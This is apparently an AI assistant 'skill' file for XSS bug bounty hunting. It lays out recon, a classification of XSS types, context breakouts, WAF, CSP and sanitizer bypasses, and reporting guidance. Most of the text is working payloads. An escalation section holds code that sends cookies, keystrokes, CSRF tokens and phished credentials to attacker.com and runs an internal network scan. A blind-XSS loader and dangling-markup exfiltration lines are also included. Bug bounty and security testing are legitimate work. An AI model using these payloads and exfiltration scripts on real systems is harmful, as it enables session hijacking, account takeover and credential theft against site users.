---
name: xss-bug-bounty-hunter
description: >
  Comprehensive XSS hunting methodology for bug bounty programs (BBP) and vulnerability
  disclosure programs (VDP). Use this skill whenever the user asks for help discovering,
  testing, escalating, or reporting XSS vulnerabilities — including reflected, stored,
  DOM-based, mutation, blind, self, universal, mXSS, CSS injection-based, SVG-based,
  template injection-driven, prototype pollution-driven, and postMessage XSS. Also trigger
  on requests about WAF/filter bypass, sanitizer evasion, browser quirk exploitation,
  payload crafting, Burp Suite configuration, JavaScript source analysis, or reviewing
  public XSS reports from HackerOne, Bugcrowd, Intigriti, and similar platforms.
compatibility: >
  Burp Suite (Community/Pro), browser DevTools, OWASP ZAP, ffuf, dalfox, kxss,
  ParamSpider, waybackurls, gau, nuclei, XSStrike, Caido, curl, httpx, katana.
---

---

# XSS Bug Bounty Hunter — Master Skill

You are assisting a skilled bug bounty hunter in discovering, exploiting, escalating, and
reporting every class of Cross-Site Scripting vulnerability. Always reason from first
principles: understand the parser, understand the sink, then craft the payload.

---

## 0. Recon & Target Fingerprinting

Before injecting anything, map the target thoroughly.

### 0.1 Endpoint Discovery
- Run `waybackurls`, `gau`, or `katana` to harvest all historical and crawled URLs.
- Extract unique parameters: `gau target.com | grep "=" | qsreplace XSS_CANARY`
- Use `ParamSpider` for parameter mining from the Wayback Machine.
- Look beyond GET params: POST bodies, JSON keys, XML nodes, path segments, headers
  (`Referer`, `Origin`, `X-Forwarded-Host`, `User-Agent`, `Accept-Language`).
- Map file-upload endpoints: SVG, HTML, XML, and CSV uploads are frequent XSS vectors.

### 0.2 Technology Fingerprinting
Identify:
- **Frontend framework**: React, Angular, Vue, Svelte, Backbone, Ember. Each has unique
  sinks and sanitization behaviors.
- **Template engine**: Jinja2, Twig, Handlebars, Mustache, EJS, Pug. Template injection
  can escalate to XSS.
- **WAF/CDN**: Cloudflare, Akamai, AWS WAF, Imperva, Sucuri, Fastly. Check response
  headers (`Server`, `X-Powered-By`, `CF-RAY`, `X-Sucuri-ID`).
- **Sanitization libraries**: DOMPurify, sanitize-html, js-xss, Bleach, AntiSamy.
  Check the JS bundle for library versions — old versions have known bypasses.
- **CSP**: Read `Content-Security-Policy` headers. Strict CSP forces payload pivoting.

---

## 1. XSS Classification — All Known Types

### 1.1 Reflected XSS
Payload reflects in a single HTTP response from a URL parameter or header. Not persisted.
- Highest frequency in search bars, error messages, redirect parameters (`next=`, `url=`,
  `return_to=`, `redirect_uri=`), and 404/500 pages that echo the requested path.
- Often client-exploitable via crafted links; severity multiplied when authenticated users
  are the target (CSRF token theft, account takeover).

### 1.2 Stored / Persistent XSS
Payload is saved server-side (DB, log, file) and rendered for future victims.
- High-value vectors: profile bios, display names, comments, product reviews, support
  tickets, chat messages, order notes, invoice fields, file/image names (rendered in UI),
  CSV/Excel imports re-rendered in browser.
- Often triggers for ALL users who visit the page → critical severity.
- Delayed rendering: payloads injected into notifications, email templates, PDF exports
  rendered in a browser (e.g., wkhtmltopdf, Puppeteer).

### 1.3 DOM-Based XSS
The vulnerability lives entirely in client-side JavaScript. The server never sees the
payload — WAFs are blind to it.

**Sources** (where attacker-controlled data enters):
```
document.URL            window.location.href     window.location.hash
document.location       document.referrer        window.name
document.cookie         localStorage             sessionStorage
URLSearchParams         history.state            postMessage data
WebSocket messages      fetch() responses        IndexedDB values
```

**Sinks** (where data becomes executable):
```
innerHTML / outerHTML          document.write / writeln
eval()                         setTimeout(str) / setInterval(str)
Function(str)()                location.href = "javascript:..."
script.src =                   element.setAttribute("href", ...)
$.html() / $.append()          React dangerouslySetInnerHTML
Angular [innerHTML]            Vue v-html
```

**Methodology:**
1. Inject canary into URL fragment: `https://target.com/page#CANARY_XSS`
2. Open DevTools → Sources → search for the canary in JS execution via breakpoints.
3. Trace: source → intermediate variable → sink.
4. Use DOM Invader (Burp) for automated source-to-sink tracing.

### 1.4 Blind XSS (Out-of-Band)
Payload fires asynchronously — often in admin panels, CRM systems, log viewers, or email
rendering contexts the attacker can't directly see.

**Setup:**
- Host an XSS callback server (XSS Hunter Pro, canarytokens.org, your own VPS with
  a payload that `fetch`es back data).
- Typical payload:
  ```html
  "><script src="https://your-xss-hunter.com/payload.js"></script>
  ```
- Inject into: contact forms, username/display name, User-Agent, Referer, feedback
  fields, chat messages, support ticket subject lines, CSV imports, file metadata
  (EXIF data rendered server-side), email fields, log-generating inputs.

### 1.5 Self-XSS
Fires only in the victim's own browser, usually requires social engineering.
- Often dismissed as N/A, but escalate to Critical by chaining with CSRF:
  - CSRF to inject the payload into the victim's profile field → stored XSS fires for
    every user who views their profile.
- Or chain with clickjacking: trick user into pasting the payload themselves.

### 1.6 Mutation XSS (mXSS)
The browser's HTML parser mutates (transforms) the injected string into a different,
executable form after DOMPurify or other sanitizers have already processed it.
- The sanitizer sees safe input → browser re-parses → XSS fires.
- Known mXSS bypasses exploit namespace confusion (MathML/SVG), quirks in `template`
  element parsing, and foreign content parsing rules.
- Example (DOMPurify < 2.0.17):
  ```html
  <math><mtext></mtext><mglyph><style></style></mglyph><math>
  <mtext><img src onerror=alert(1)></mtext>
  ```
- Always check DOMPurify version in the JS bundle and cross-reference with its CVE list.

### 1.7 Universal XSS (UXSS)
Browser-level vulnerability that bypasses SOP/CSP for all sites — not application-level.
- Reported as browser bugs to Google, Mozilla, Apple. High value.
- Modern UXSS often found in browser extensions that process page content.
- Extension content scripts that call `innerHTML` on attacker-controlled data.

### 1.8 CSS Injection → XSS
Pure CSS injection can leak data; in some contexts it achieves XSS.
- `expression()` in old IE: `body { background: expression(alert(1)) }`
- In SVG filters with `feImage` pointing to a JS URI.
- CSS injection into `<style>` context can load external resources to exfiltrate tokens.

### 1.9 SVG-Based XSS
SVG files are XML and support embedded script. Upload SVGs where possible.
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
  <script>alert(document.domain)</script>
</svg>
```
- Works even when served from the same origin.
- Check for `Content-Type: image/svg+xml` — if the app serves uploaded SVGs with that
  header on the target domain, it's direct XSS.

### 1.10 Template Injection → XSS
Server-side template injection (SSTI) often escalates to reflected XSS or RCE.
- Handlebars: `{{constructor.constructor('alert(1)')()}}`
- AngularJS client-side template injection (sandbox escape):
  ```
  {{constructor.constructor('alert(1)')()}}
  ```
- Pug/Jade: `#{function(){localLoad=global.process.mainModule.require;...}()}`

### 1.11 Prototype Pollution → XSS
Client-side prototype pollution can set properties on `Object.prototype` that are later
used as HTML sinks by library code.
- Example: polluting `innerHTML` property via a gadget in jQuery or lodash.
- Tooling: `ppmap`, `ppfuzz`, DOM Invader prototype pollution mode.
- Real-world: HackerOne reports on Lodash (`__proto__[sourceURL]`), jQuery gadgets.

### 1.12 postMessage XSS
Apps using `window.postMessage()` without strict origin validation.
```javascript
// Vulnerable receiver
window.addEventListener('message', function(e) {
  document.getElementById('output').innerHTML = e.data; // sink!
});
```
- Craft an iframe or opener window that sends a malicious message.
- Check `event.origin` validation — if absent or using weak `indexOf()` check → bypass.

### 1.13 XSS via CORS / JSONP
- JSONP endpoints that reflect the callback parameter:
  `https://api.target.com/data?callback=alert(1)//`
- Misconfigured CORS that reflects `Origin` in `Access-Control-Allow-Origin` and allows
  credentials: enables token theft from a cross-origin attacker page.

### 1.14 XSS in PDF Renderers
- Inject XSS into fields rendered by wkhtmltopdf, Headless Chrome, PhantomJS.
- These renderers execute JavaScript during PDF generation.
- Common in invoice generators, report exporters.
- Payload in a name field: `<script>document.write(document.cookie)</script>`

### 1.15 XSS in Electron / Hybrid Apps
- If the target has a desktop app built on Electron, look for `nodeIntegration: true`.
- XSS in Electron + nodeIntegration = RCE.

### 1.16 Dangling Markup / Partial-Context XSS
When you can't execute JS but can inject partial HTML, use dangling markup to exfiltrate
CSRF tokens or sensitive attribute values via `<img src="https://attacker.com/?q=`:
```html
<img src='https://attacker.com/?data=
```
The browser fetches a URL that includes everything up to the next `'` — leaking tokens.

---

## 2. Phase 1 — Injection & Reflection Mapping

### 2.1 Canary Strategy
Never start with payloads. First confirm reflection:
- Use a unique alphanumeric string: `xss7f3qtest`, `CANARY_XSS_BOUNTY`
- Inject into every parameter simultaneously (Burp Intruder cluster bomb).
- Check: HTML body, HTML attributes, JS strings, JSON values, URL contexts, HTTP headers
  in responses, hidden form fields.

### 2.2 Automated Initial Sweep
```bash
# Passive param discovery
echo "target.com" | gau | grep "=" | sort -u > params.txt

# Active XSS scan with dalfox
cat params.txt | dalfox pipe --skip-bav --mining-dom --follow-redirects

# kxss for quick reflection check
cat params.txt | kxss

# nuclei XSS templates
nuclei -l params.txt -t /nuclei-templates/dast/vulnerabilities/xss/
```

### 2.3 Burp Suite Configuration
- Enable passive scanning on all traffic.
- Add custom scan insertion point for headers: `X-Forwarded-Host`, `Referer`, `Origin`.
- Use Burp Collaborator for blind XSS OOB callbacks.
- Install DOM Invader extension — enable all modes (XSS, prototype pollution, postMessage).
- Use "Param Miner" extension to discover hidden/unlinked parameters.
- Use "Reflected Parameters" extension to highlight all reflected inputs automatically.

---

## 3. Phase 2 — Syntactic Context Breakout

Identify the reflection context FIRST, then select the appropriate breakout technique.

### 3.1 Context: Between HTML Tags
```html
<!-- Reflection: -->  <div>CANARY</div>

<!-- Basic payloads -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

### 3.2 Context: Inside HTML Attribute Value (Double-Quoted)
```html
<!-- Reflection: --> <input value="CANARY">

" onmouseover="alert(1)
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
" autofocus onfocus="alert(1)
```

### 3.3 Context: Inside HTML Attribute Value (Single-Quoted)
```html
<!-- Reflection: --> <input value='CANARY'>

' onmouseover='alert(1)
'><img src=x onerror=alert(1)>
```

### 3.4 Context: Unquoted Attribute
```html
<!-- Reflection: --> <input value=CANARY>

CANARY onmouseover=alert(1)
CANARY/><img src=x onerror=alert(1)>
```

### 3.5 Context: Inside `href` or `src` Attribute
```html
<!-- Reflection: --> <a href="CANARY">

javascript:alert(1)
javascript:void(alert(1))
javascript://%0aalert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 3.6 Context: Inside JavaScript String (Single-Quoted)
```javascript
// Reflection:  var x = 'CANARY';

'-alert(1)-'
';alert(1)//
\';alert(1)//
'+alert(1)+'
</script><script>alert(1)</script>
```

### 3.7 Context: Inside JavaScript String (Double-Quoted)
```javascript
// Reflection:  var x = "CANARY";

"-alert(1)-"
";alert(1)//
\";alert(1)//
```

### 3.8 Context: Inside a JS Template Literal
```javascript
// Reflection:  var x = `CANARY`;

${alert(1)}
`-alert(1)-`
```

### 3.9 Context: Inside a JSON Value
```json
{"key":"CANARY"}
```
- Break out of the JSON string, then out of the script block:
  ```
  ","key":"<\/script><script>alert(1)<\/script>
  ```

### 3.10 Context: Inside a `<script>` Block (not in a string)
```html
<script>
  var config = CANARY;
</script>
```
- Inject directly: `alert(1);`
- Or close and reopen: `</script><script>alert(1)</script>`

### 3.11 Context: Inside HTML Comments
```html
<!-- CANARY -->

--><script>alert(1)</script><!--
```

### 3.12 Context: Inside `<style>` Block
```css
/* IE only */  body { background: expression(alert(1)) }
```
- For modern browsers: break out of the style block:
  ```
  </style><script>alert(1)</script>
  ```

---

## 4. Phase 3 — WAF & Filter Bypass Encyclopedia

### 4.1 Tag-Level Bypasses

**Script tag blocked:**
```html
<ScRiPt>alert(1)</ScRiPt>
<scr\x00ipt>alert(1)</scr\x00ipt>
<scr ipt>alert(1)</scr ipt>
<script/x>alert(1)</script>
<script ~~~>alert(1)</script>
<!-- If non-recursive strip: -->
<scr<script>ipt>alert(1)</scr</script>ipt>
```

**Alternative executable tags (no `<script>` needed):**
```html
<img src=x onerror=alert(1)>
<img src=x onerror="javascript:alert(1)">
<video><source onerror=alert(1)>
<video src onerror=alert(1)>
<audio src onerror=alert(1)>
<iframe onload=alert(1)>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
<math href=javascript:alert(1)>CLICK</math>
<table background=javascript:alert(1)>
<svg><use href="data:image/svg+xml,...#x"/></svg>
```

### 4.2 Event Handler Bypasses

**When common handlers (`onclick`, `onerror`) are blocked:**
```html
<!-- HTML5 event handlers less likely to be in blocklists -->
<input autofocus onfocus=alert(1)>
<body onpageshow=alert(1)>
<body onhashchange=alert(1)><a href=#>click</a>
<div onpointerover=alert(1)>HOVER</div>
<div onpointerenter=alert(1)>HOVER</div>
<div onmouseenter=alert(1)>HOVER</div>
<div onmousewheel=alert(1)>SCROLL</div>
<details ontoggle=alert(1) open>
<form id=test onforminput=alert(1)><input></form>
<button formaction=javascript:alert(1)>XSS</button>
<isindex type=image src=1 onerror=alert(1)>
```

### 4.3 Character/Encoding Bypasses

**HTML Entity Encoding:**
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
```

**Unicode escapes in JS context:**
```javascript
\u0061\u006c\u0065\u0072\u0074(1)
\u{61}\u{6c}\u{65}\u{72}\u{74}(1)
```

**URL encoding (for URL contexts):**
```
javascript:%61%6c%65%72%74%28%31%29
```

**Double encoding (when server decodes once, browser decodes again):**
```
%253Cscript%253Ealert(1)%253C/script%253E
```

**Base64 via data URI:**
```html
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

**Tab/newline injection in JS URIs (bypasses regex filters):**
```
java&#9;script:alert(1)    (tab)
java&#10;script:alert(1)   (newline)
java&#13;script:alert(1)   (carriage return)
java\tscript:alert(1)
```

### 4.4 String Construction Without Quotes

```javascript
// Using String.fromCharCode
String.fromCharCode(97,108,101,114,116,40,49,41)
eval(String.fromCharCode(97,108,101,114,116,40,49,41))

// Using bracket notation
window['ale'+'rt'](1)
window['\x61\x6c\x65\x72\x74'](1)

// Template literals
eval`alert\x281\x29`

// Regex toString
/alert(1)/.source  // 'alert(1)'
eval(/alert(1)/.source)

// Using constructor
[].constructor.constructor('alert(1)')()
''['constructor']['constructor']('alert(1)')()
```

### 4.5 Parenthesis-Free Payloads

```javascript
// When parentheses are filtered
alert`1`
throw/onerror=alert/1   // only in some browsers
onerror=alert;throw 1
<svg onload="window.onerror=eval;throw'=alert\x281\x29'">
```

### 4.6 Keyword Bypasses

**`alert` blocked:**
```javascript
confirm(1)
prompt(1)
console.log(1)
(a=alert)(1)
top['al'+'ert'](1)
window['alert'](1)
eval('ale'+'rt(1)')
Function('alert(1)')()
setTimeout('alert(1)',0)
```

**`document.cookie` blocked (use alternatives):**
```javascript
window['document']['cookie']
frames[0].document.cookie
parent.document.cookie
```

### 4.7 Length-Restricted Contexts

Shortest known XSS payloads for tight character limits:
```html
<svg/onload=alert(1)>          <!-- 24 chars -->
<q/oncut=alert(1)>             <!-- 21 chars; requires interaction -->
<q oncut=alert(1)>             <!-- 20 chars -->
<script>alert(1)               <!-- 21 chars; no closing tag needed in some parsers -->
```

For extremely tight limits (<15 chars), use a two-stage approach:
1. Inject: `<script src=//x.co>` (loads from your short domain)
2. Host payload at the URL.

### 4.8 Null Bytes & Special Characters

```
<scr\x00ipt>alert(1)</scr\x00ipt>   (legacy IE/PHP)
<!--<img src="--><img src=x onerror=alert(1)//">
<![CDATA[<script>]]>alert(1)</script>   (XML parser quirks)
```

### 4.9 Charset / Encoding Attacks

- **UTF-7** (very old IE): `+ADw-script+AD4-alert(1)+ADw-/script+AD4-`
- **UTF-16**: Use Burp to send raw UTF-16 encoded payloads.
- **Overlong UTF-8**: `%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE` (old parsers)
- **ISO-8859-1 / Latin-1**: When charset is not explicitly set, browsers may sniff.

### 4.10 CSP Bypasses

**CSP: `script-src 'self'`**
- Find JSONP endpoint on target origin: `https://target.com/api/jsonp?cb=alert(1)`
- Find Angular on same origin → AngularJS sandbox escape as CSP bypass.
- Find `script-src` whitelisted CDN with user-controlled JSONP: `https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js`

**CSP: `script-src 'nonce-xxx'`**
- If nonce is predictable or reused: reuse it.
- If there's a `base-uri` bypass: inject `<base href=//attacker.com>` to load scripts from attacker.
- `strict-dynamic` allows script loaded by nonced script — find DOM XSS in loaded scripts.

**CSP: `script-src 'unsafe-eval' 'self'`**
- AngularJS (1.x) can eval templates: inject `{{7*7}}` → `{{constructor.constructor('alert(1)')()} }`

**CSP: Whitelisted CDNs**
Common bypasses via whitelisted CDNs:
- `//cdnjs.cloudflare.com` → Angular, Prototype.js gadgets.
- `//cdn.jsdelivr.net` → controllable path, can load any public package.

**iframe sandbox bypass:**
```html
<iframe srcdoc="<script>top.alert(1)</script>">
```

**`script-src data:`**
```html
<script src="data:text/javascript,alert(1)"></script>
```

### 4.11 Cloudflare-Specific Bypasses (Historical / Research)
```html
<!-- Capitalization + encoding -->
<Img Src=1 OnError=confirm(1)>
<ImG/sRc=x oNeRrOr=alert(1)>

<!-- SVG foreign object -->
<svg><foreignObject><iframe/onload=alert(1)></foreignObject></svg>

<!-- Comment in tag name -->
<img<!-- -->src=x onerror=alert(1)>
```
*Note: Test these — WAF rules update constantly. These are research starting points.*

### 4.12 Akamai-Specific Bypass Patterns
- Extra whitespace in attributes: `<img src = x onerror = alert(1)>`
- Unusual event handlers: `<body onafterprint=alert(1)>`
- SVG animation: `<svg><animate onbegin=alert(1) attributeName=x></animate></svg>`

### 4.13 ModSecurity / OWASP Core Rule Set Bypasses
```html
<a href="j\tav&#x61;script:alert(1)">XSS</a>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">XSS</a>
<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a></svg>
```

---

## 5. Phase 4 — DOM XSS Deep-Dive

### 5.1 Source Enumeration
Search the JS bundle for dangerous source assignments:
```javascript
// grep patterns in JS files
location.hash
location.search
document.URL
document.referrer
window.name
decodeURIComponent(location
URLSearchParams
localStorage.getItem
sessionStorage.getItem
```

### 5.2 Sink Enumeration
```javascript
innerHTML =
outerHTML =
document.write(
document.writeln(
eval(
setTimeout(     // when first arg is a string
setInterval(    // when first arg is a string
Function(
location.href =
location =
location.replace(
location.assign(
element.src =
$.html(
$.append(
$.prepend(
$.after(
$.before(
$(                // jQuery $(userInput) — executes HTML
dangerouslySetInnerHTML
[innerHTML]       // Angular
v-html            // Vue
```

### 5.3 DOM XSS via Frameworks

**AngularJS 1.x (client-side template injection):**
```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

**React `dangerouslySetInnerHTML`:**
- Find in source: `dangerouslySetInnerHTML={{__html: userVar}}`
- If user controls `userVar`, it's stored/reflected DOM XSS.

**Vue `v-html`:**
- Find in templates: `<div v-html="userContent">`
- User-controlled `userContent` → XSS.

### 5.4 DOM Clobbering
Use HTML injection (without script execution) to overwrite DOM API properties and
cause unexpected behavior:
```html
<a id=defaultView href=//attacker.com>
<img name=cookie src=//attacker.com/?c=
<form id=someID><input name=action value=//attacker.com>
```
Escalate with prototype pollution to achieve script execution.

### 5.5 postMessage Attack Pattern
```javascript
// Host this on attacker.com
<script>
var target = window.open('https://victim.com/page');
setTimeout(function() {
  target.postMessage('<img src=x onerror=alert(document.domain)>', '*');
}, 2000);
</script>
```

---

## 6. Phase 5 — Filter Detection & Probing Strategy

Before crafting the final payload, determine exactly what is filtered.

### 6.1 Systematic Probing
Test each character and keyword in isolation using Burp Intruder:
- Test characters: `< > " ' / \ ( ) ; : = { } [ ] & % # + - @ ! |`
- Test keywords: `script`, `alert`, `onerror`, `onload`, `javascript`, `eval`, `document`
- Test combinations: `<script>`, `on*=`, `src=`, `href=`

### 6.2 Reflection Analysis
For each test:
1. Is it **blocked** (WAF 403/406)?
2. Is it **stripped** (removed entirely)?
3. Is it **encoded** (HTML-encoded, URL-encoded)?
4. Is it **reflected as-is**?

Based on this, choose the bypass category from Phase 3.

### 6.3 Differential Analysis
- Compare the response when the keyword is in a different position.
- Compare response with URL encoding vs raw.
- Compare response via GET vs POST.
- Try chunked transfer encoding to bypass body inspection.
- Try `Content-Type: multipart/form-data` to confuse WAF body parsers.

---

## 7. Phase 6 — Context-Specific Techniques from Real-World Reports

### 7.1 Search Bar / Query Parameters
- Most common finding. Always test `q=`, `search=`, `query=`, `keyword=`, `s=`.
- Check if query is reflected in page title, meta tags, og:title (Twitter Card injection).
- Real-world: Google, Yahoo, Bing subdomains all had reflected XSS in search params.

### 7.2 Redirect Parameters
- `next=`, `return=`, `returnUrl=`, `redirect_uri=`, `url=`, `to=`, `goto=`, `redir=`
- Inject `javascript:alert(document.domain)` or `data:text/html,...`
- Real-world: OAuth redirect_uri XSS is a critical finding on many programs.

### 7.3 Error Pages / 404 Pages
- The requested URL path is often reflected in error messages: `404 Not Found: /CANARY`
- Path-based reflection: `https://target.com/<script>alert(1)</script>`
- Real-world: Shopify, various CDNs have had path-reflected XSS.

### 7.4 HTTP Headers
- `Referer: <script>alert(1)</script>` (reflected in analytics or error pages)
- `User-Agent` (reflected in admin panels, device detection pages)
- `X-Forwarded-For` (reflected in IP display features)
- `X-Forwarded-Host` (reflected in generated links, password reset emails)
- `Origin` (reflected in CORS responses without sanitization)
- `Accept-Language` (reflected in locale detection)

### 7.5 File Upload / Name / Metadata
- Upload a file named `"><img src=x onerror=alert(1)>.png` — if the name is rendered in
  the UI without encoding → XSS.
- Upload SVG: `<svg><script>alert(1)</script></svg>` — if served from same origin → XSS.
- Upload HTML file if allowed — instant XSS if served same-origin.
- EXIF metadata injection: embed XSS in EXIF `Comment` field of a JPEG — if the app
  displays EXIF data on the page without sanitization.

### 7.6 Profile / Account Fields
- Display name, bio, website URL, company name, job title.
- Website URL field: inject `javascript:alert(1)` — if rendered as `<a href=...>`.
- These are stored XSS — highest severity.
- Real-world: Twitter, Facebook, LinkedIn, Shopify all had stored XSS in profile fields.

### 7.7 Markdown / Rich Text Editors
- Test if markdown is rendered: `[click](javascript:alert(1))`
- Test HTML passthrough in "safe HTML" mode.
- Test for mXSS via DOMPurify bypass.
- `<a href="javascript&colon;alert(1)">click</a>` — `&colon;` decoded post-sanitization.
- Real-world: GitHub, GitLab, HackerOne have all had markdown XSS.

### 7.8 JSON API Responses Rendered in DOM
- Find API endpoints that return JSON data later rendered via JS into the DOM.
- If the JSON value is placed into `innerHTML` → stored/reflected DOM XSS.
- Inject XSS payload into JSON fields (username, title, body) via legitimate API calls.

### 7.9 Third-Party Integrations / Widgets
- Disqus comments, Intercom, Zendesk widgets embedded on the page.
- User-controlled data flowing into third-party widgets.
- Real-world: third-party chat widgets have had stored XSS affecting all pages they're embedded on.

### 7.10 CSV/Excel Export → Re-import
- Inject formula: `=HYPERLINK("javascript:alert(1)","click")` — rendered in Excel.
- Inject XSS into CSV fields that are later imported and rendered in browser.

### 7.11 GraphQL Introspection / Field Injection
- Inject XSS payloads into all string mutations (not just obvious user-facing fields).
- Many GraphQL APIs lack proper output encoding.

### 7.12 WebSockets
- Intercept WebSocket messages in Burp Suite.
- Modify the message data to include XSS payloads — if the data is rendered in the DOM.
- Real-world: chat applications are very high-risk for stored XSS via WebSocket.

### 7.13 Subdomain Takeover + XSS
- Claim an abandoned subdomain (dangling CNAME pointing to unclaimed S3/GitHub Pages).
- Host XSS payload there.
- Escalates to same-origin access if the main app uses `document.domain` relaxation.

### 7.14 Open Redirect → XSS
- `https://target.com/redirect?url=javascript:alert(1)` rendered in a link.
- Or: `https://target.com/redirect?url=data:text/html,<script>alert(1)</script>`

### 7.15 RPO (Relative Path Overwrite)
- Inject a path like `https://target.com/page%2F..%2F..` to cause the browser to resolve
  relative stylesheet/script paths to attacker-controlled URLs.

### 7.16 Browser-Side Request Forgery via XSS
- Use an existing XSS to pivot: make authenticated requests, read responses (same-origin),
  exfiltrate CSRF tokens, alter account settings.

---

## 8. Phase 7 — Escalation & Impact Maximization

### 8.1 Session Hijacking (When HttpOnly Not Set)
```javascript
new Image().src = "https://attacker.com/steal?c=" + encodeURIComponent(document.cookie);
fetch("https://attacker.com/steal?c=" + encodeURIComponent(document.cookie));
```

### 8.2 CSRF Token Theft → Account Takeover
```javascript
// Step 1: Fetch the CSRF token from the settings page
fetch('/account/settings')
  .then(r => r.text())
  .then(html => {
    const token = html.match(/csrf_token.*?value="(.+?)"/)[1];
    // Step 2: Use it to change email/password
    return fetch('/account/email', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'csrf=' + token + '&email=attacker@evil.com'
    });
  });
```

### 8.3 Credential Phishing via DOM Manipulation
```javascript
document.body.innerHTML = '<form action="https://attacker.com/capture" method=POST>'
  + '<input type=text name=user placeholder=Username><br>'
  + '<input type=password name=pass placeholder=Password><br>'
  + '<button>Login</button></form>';
```

### 8.4 Keylogger
```javascript
document.addEventListener('keydown', function(e) {
  new Image().src = "https://attacker.com/k?k=" + e.key;
});
```

### 8.5 Internal Network Scanning via XSS
```javascript
// Scan internal IPs via XSS in an intranet admin panel
['192.168.1.1','10.0.0.1','172.16.0.1'].forEach(ip => {
  var img = new Image();
  img.onload = () => fetch('https://attacker.com/scan?ip='+ip+'&status=up');
  img.onerror = () => fetch('https://attacker.com/scan?ip='+ip+'&status=down');
  img.src = 'http://' + ip;
});
```

### 8.6 Cryptocurrency Wallet Theft
On crypto platforms: use XSS to alter destination wallet addresses in transaction forms.

### 8.7 Capturing Screenshots (Headless Browser)
Inject `html2canvas` or capture the page as an image for exfiltration.

---

## 9. Phase 8 — Reporting Best Practices for Bug Bounty

### 9.1 Proof of Concept Requirements
Always include:
1. **Full reproduction steps** with exact URL and parameter.
2. **Minimal PoC URL** or HTML page.
3. **Screenshot/video** showing the alert or callback.
4. **Impact statement**: don't just say "XSS" — explain the worst-case scenario for a
   victim (session hijacking, account takeover, data theft).
5. **CVSS score** with justification.

### 9.2 Severity Classification
| Type | Typical Severity | Escalation to Critical |
|------|-----------------|----------------------|
| Self-XSS | N/A / Informational | Chain with CSRF |
| Reflected XSS (unauth) | Medium | Affects all users via crafted link |
| Reflected XSS (auth) | Medium–High | CSRF token theft |
| Stored XSS (any user) | High | All visitors affected |
| Stored XSS (admin panel) | Critical | Admin account takeover |
| Blind XSS (admin panel) | Critical | Admin → full app compromise |
| DOM XSS (hash-based) | Low–Medium | Requires social engineering |
| DOM XSS (search param) | Medium–High | No interaction needed |

### 9.3 Common Triage Mistakes to Preempt
- **Duplicate**: Search HackerOne/Bugcrowd Disclosed reports before submitting.
- **Out of scope**: Check program scope carefully — subdomains, third-party hosts.
- **Self-XSS dismissed**: Proactively address by showing the CSRF chain.
- **WAF mitigated**: Show the WAF bypass — don't let the program close with "WAF blocks it."

---

## 10. Toolchain Reference

| Tool | Purpose |
|------|---------|
| Burp Suite Pro | Proxy, scanner, DOM Invader, Collaborator |
| Caido | Lightweight Burp alternative |
| dalfox | Automated parameter XSS scanning |
| kxss | Fast reflection detection |
| XSStrike | Intelligent XSS payload generator |
| gau / waybackurls | Historical URL/parameter mining |
| ParamSpider | JS-file parameter extraction |
| katana | Modern JS-aware crawler |
| nuclei | Template-based XSS scanning |
| ppmap / ppfuzz | Prototype pollution detection |
| DOM Invader | DOM XSS source-sink tracing (Burp ext) |
| Param Miner | Hidden parameter discovery (Burp ext) |
| XSS Hunter Pro | Blind XSS callback platform |
| canarytokens.org | Quick blind XSS OOB callback |
| Hackvertor | Encoding/obfuscation (Burp ext) |
| htmlq / pup | HTML parsing from CLI |

---

## 11. Quick-Reference Payload Cheatsheet

```
BASIC CONFIRMATION
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>

NO QUOTES
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

NO PARENTHESES
alert`1`
onerror=alert;throw 1

JAVASCRIPT URI
javascript:alert(1)
javascript://comment%0aalert(1)

DATA URI
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

HTML ENCODED (for JS event handler context)
&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;

TEMPLATE LITERAL (JS context)
${alert(1)}

ANGULARJS SSTI
{{constructor.constructor('alert(1)')()}}

DOM (hash-based)
#<img src=x onerror=alert(1)>

BLIND XSS
"><script src=//your-xss-hunter.com/p.js></script>
```

---

## 12. Known DOMPurify Bypass History (For Version Checking)

| DOMPurify Version | Bypass |
|-------------------|--------|
| < 1.0.9 | `<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>` |
| < 2.0.17 | mXSS via MathML namespace confusion |
| < 2.3.1 | `<math><mtext><table><mglyph><style><img src onerror=alert(1)>` |
| < 3.0.6 | Prototype pollution leading to bypass |

Always grep the JS bundle for `DOMPurify` version and cross-reference with NVD/GitHub.

---

## 13. Methodology Flowchart

```
Target → Recon (gau/waybackurls/katana)
       → Parameter List
       → Canary Injection (all params, all headers)
       → Reflection Found?
           ├─ YES → Context Analysis → Breakout Payload → WAF Hit?
           │           ├─ YES → Bypass Phase 3 → Re-test
           │           └─ NO  → Escalation (Phase 8) → Report
           └─ NO  → DOM Analysis (DevTools/DOM Invader)
                   → Source Found? → Sink Found? → DOM Payload
